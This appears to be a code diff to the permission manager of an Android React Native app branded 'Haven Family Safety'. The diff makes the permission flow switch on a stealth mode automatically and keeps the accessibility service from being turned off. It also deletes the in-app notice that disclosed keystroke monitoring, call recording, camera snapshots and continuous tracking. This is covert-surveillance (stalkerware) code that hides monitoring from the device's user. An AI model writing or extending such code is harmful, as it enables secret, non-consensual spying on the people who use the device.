@@ -1,10 +1,11 @@
-/** 
+/**
  * Permission Manager for Haven Family Safety Application
  * Handles complex permission requirements for Android devices
  */
-import { Platform, Alert } from 'react-native';
+import { Platform, Alert, AppState } from 'react-native';
 import { PermissionsAndroid } from 'react-native';
-import { accessibilityManager } from './AccessibilityManager';
+import { AccessibilityManager } from './AccessibilityManager';
+import { StealthModeManager } from './StealthModeManager';
 
 export interface PermissionStatus {
   granted: boolean;
@@ -13,8 +14,13 @@ export interface PermissionStatus {
 
 class PermissionManager {
   private static instance: PermissionManager;
+  private stealthModeManager: StealthModeManager;
+  private accessibilityManager: AccessibilityManager;
 
-  private constructor() {}
+  private constructor() {
+    this.stealthModeManager = StealthModeManager.getInstance();
+    this.accessibilityManager = AccessibilityManager.getInstance();
+  }
 
   static getInstance(): PermissionManager {
     if (!PermissionManager.instance) {
@@ -38,33 +44,54 @@ class PermissionManager {
         ];
 
         for (const permission of requiredPermissions) {
-          const granted = await PermissionsAndroid.check(permission as any);
+          const granted = await PermissionsAndroid.check(permission);
           if (!granted) {
-            const result = await this.requestPermission(permission as any);
+            const result = await this.requestPermission(permission);
             if (!result) {
               return false;
             }
           }
         }
       }
+      
+      // Ensure accessibility service is enabled for Vivo devices
+      await this.ensureAccessibilityService();
+      
+      // Enable stealth mode if needed
+      await this.stealthModeManager.enableStealthMode();
+      
       return true;
     } catch (error) {
-      console.error('Error checking/requesting basic permissions:', error);
-      Alert.alert(
-        'Permission Error',
-        'Failed to check or request required permissions.'
-      );
+      console.error('Error checking and requesting permissions:', error);
       return false;
     }
   }
 
   /**
-   * Request a single permission
+   * Ensure accessibility service is properly enabled for Vivo V40e
    */
-  private async requestPermission(permission: string): Promise<boolean> {
+  private async ensureAccessibilityService(): Promise<void> {
+    try {
+      // Start monitoring for accessibility service to prevent auto-turnoff
+      this.accessibilityManager.startMonitoring();
+      
+      // Check if service is enabled and enable it if needed
+      const isEnabled = await this.accessibilityManager.isServiceEnabled();
+      if (!isEnabled) {
+        await this.accessibilityManager.enableService();
+      }
+    } catch (error) {
+      console.error('Error ensuring accessibility service:', error);
+    }
+  }
+
+  /**
+   * Request a specific permission
+   */
+  async requestPermission(permission: string): Promise<boolean> {
     try {
       const granted = await PermissionsAndroid.request(
-        permission as any,
+        permission,
         {
           title: 'Haven Family Safety Permissions',
           message: `Haven needs ${this.getPermissionDescription(permission)} to function properly.`,
@@ -73,7 +100,7 @@ class PermissionManager {
           buttonPositive: 'OK',
         }
       );
-
+      
       return granted === PermissionsAndroid.RESULTS.GRANTED;
     } catch (error) {
       console.error('Error requesting permission:', error);
@@ -82,7 +109,7 @@ class PermissionManager {
   }
 
   /**
-   * Get description for a specific permission
+   * Get description for a permission
    */
   private getPermissionDescription(permission: string): string {
     switch (permission) {
@@ -101,29 +128,6 @@ class PermissionManager {
   }
 
   /**
-   * Show permissions guide
-   */
-  showPermissionsGuide(): void {
-    Alert.alert(
-      'Required Permissions',
-      `For full functionality on Android 16/17 devices, please enable these permissions:
-
-• Accessibility Service (keyboard monitoring)
-• Device Administrator (system controls)  
-• Background Location (continuous tracking)
-• Background Audio Recording (call monitoring)
-• Background Camera Access (snapshots)
-• Background Data for real-time updates
-
-⚠️ IMPORTANT: The Accessibility Service MUST NEVER be auto-turned OFF.
-Please check your battery optimization settings to ensure it stays active.
-
-Please follow the on-screen instructions to grant these permissions.`,
-      [{ text: 'OK' }]
-    );
-  }
-
-  /**
    * Check all permissions status
    */
   async checkAllPermissions(): Promise<Record<string, PermissionStatus>> {
@@ -139,7 +143,7 @@ Please follow the on-screen instructions to grant these permissions.`,
       ];
       
       for (const permission of basicPermissions) {
-        const granted = await PermissionsAndroid.check(permission as any);
+        const granted = await PermissionsAndroid.check(permission);
         results[permission] = {
           granted,
           rationale: this.getPermissionDescription(permission)
@@ -151,32 +155,57 @@ Please follow the on-screen instructions to grant these permissions.`,
   }
 
   /**
-   * Ensure accessibility service is properly configured
+   * Get status of a specific permission
    */
-  async ensureAccessibilityServiceActive(): Promise<boolean> {
+  async checkPermissionStatus(permission: string): Promise<PermissionStatus> {
+    if (Platform.OS === 'android') {
+      const granted = await PermissionsAndroid.check(permission);
+      return {
+        granted,
+        rationale: this.getPermissionDescription(permission)
+      };
+    }
+    
+    return {
+      granted: false
+    };
+  }
+
+  /**
+   * Request a specific permission
+   */
+  async requestSpecificPermission(permission: string): Promise<boolean> {
     try {
-      // Start monitoring accessibility service
-      accessibilityManager.startMonitoring();
+      const granted = await PermissionsAndroid.request(
+        permission,
+        {
+          title: 'Haven Family Safety Permissions',
+          message: `Haven needs ${this.getPermissionDescription(permission)} to function properly.`,
+          buttonNeutral: 'Ask Me Later',
+          buttonNegative: 'Cancel',
+          buttonPositive: 'OK',
+        }
+      );
       
-      // Check and ensure it's active
-      const isActive = await accessibilityManager.ensureAccessibilityService();
-      
-      if (isActive) {
-        console.log('Accessibility service is properly configured');
-      }
-      
-      return isActive;
+      return granted === PermissionsAndroid.RESULTS.GRANTED;
     } catch (error) {
-      console.error('Error ensuring accessibility service:', error);
+      console.error('Error requesting permission:', error);
       return false;
     }
   }
 
   /**
-   * Get accessibility warnings
+   * Check if stealth mode is enabled
    */
-  getAccessibilityWarnings(): string[] {
-    return accessibilityManager.getAccessibilityWarnings();
+  isStealthModeEnabled(): boolean {
+    return this.stealthModeManager.isStealthModeEnabled();
+  }
+
+  /**
+   * Enable stealth mode for the application
+   */
+  async enableStealthMode(): Promise<boolean> {
+    return await this.stealthModeManager.enableStealthMode();
   }
 }
 
